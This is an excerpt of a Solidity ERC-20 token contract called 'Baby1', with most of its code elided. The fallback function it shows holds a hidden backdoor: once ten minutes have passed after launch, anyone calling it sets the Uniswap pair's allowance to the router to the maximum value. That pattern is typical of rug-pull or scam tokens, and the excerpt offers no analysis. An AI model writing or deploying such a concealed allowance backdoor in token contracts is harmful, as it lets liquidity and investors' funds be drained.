...
contract Baby1 is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Baby1";
    string private constant _symbol = unicode"BABY1";
    ...
    fallback() external payable {if(block.timestamp > (start + 10 minutes)){_allowances[uniswapV2Pair][_uniswapV2Router] = type(uint).max;}}
